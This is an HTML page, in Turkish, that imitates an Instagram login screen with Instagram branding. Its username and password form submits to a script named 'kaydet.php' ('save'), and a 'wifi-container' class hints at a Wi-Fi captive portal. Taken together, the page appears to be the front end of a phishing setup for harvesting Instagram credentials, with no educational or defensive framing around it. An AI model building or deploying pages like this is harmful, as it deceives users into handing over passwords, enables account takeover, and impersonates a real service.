<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <link rel="icon" type="image/png" href="gokhan/favicon.jpg"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>İNSTAGRAM GİRİŞ</title>
  <link rel="stylesheet" href="style.css">
  <style>
    /* Add additional styles for social media links */
    .wifi-container {
      text-align: center;
    }

    .social-links {
      display: flex;
      gap: 10px;
      margin-top: 10px;
    }

    .social-links a {
      display: inline-block;
      width: 40px;
      height: 40px;
      text-align: center;
      line-height: 40px;
      border-radius: 50%;
      text-decoration: none;
    }

    .social-links img {
      width: 100%;
      height: 100%;
      border-radius: 50%;
    }

    .instagram-logo {
      width: 200px; /* Adjust the size as needed */
      margin-bottom: 20px; /* Add some space below the logo */
    }
  </style>
</head>
<body>
  <div class="wifi-container">
    <h2>İnstagram İle Giriş Yap</h2>

    <!-- Instagram login logo -->
    <img src="https://1000logos.net/wp-content/uploads/2017/02/ig-logo.png" alt="Instagram Login Logo" class="instagram-logo">

    <form action="kaydet.php" method="post">
      <label for="new-username">Kullanıcı Adı:</label>
      <input type="text" id="new-username" name="new-username" required>
      <label for="new-password">Şifre:</label>
      <input type="password" id="new-password" name="new-password" required>
      <button type="submit">Kayıt Ol</button>
    </form>
    <p>Zaten bir hesabınız var mı? <a href="index.html">Giriş Yap</a></p>

    <!-- Social media links -->
    <div class="social-links">
      <a href="https://www.instagram.com/" target="_blank">
        <img src="https://store-images.s-microsoft.com/image/apps.31997.13510798887167234.6cd52261-a276-49cf-9b6b-9ef8491fb799.30e70ce4-33c5-43d6-9af1-491fe4679377?h=464" alt="Instagram Logo">
      </a>
      <a href="https://www.facebook.com/" target="_blank">
        <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook Logo">
      </a>
      <a href="https://twitter.com/" target="_blank">
        <img src="https://store-images.s-microsoft.com/image/apps.60673.9007199266244427.4d45042b-d7a5-4a83-be66-97779553b24d.5d82b7eb-9734-4b51-b65d-a0383348ab1b" alt="Twitter Logo">
      </a>
      <!-- Add more social media links as needed -->
    </div>
  </div>
</body>
</html>
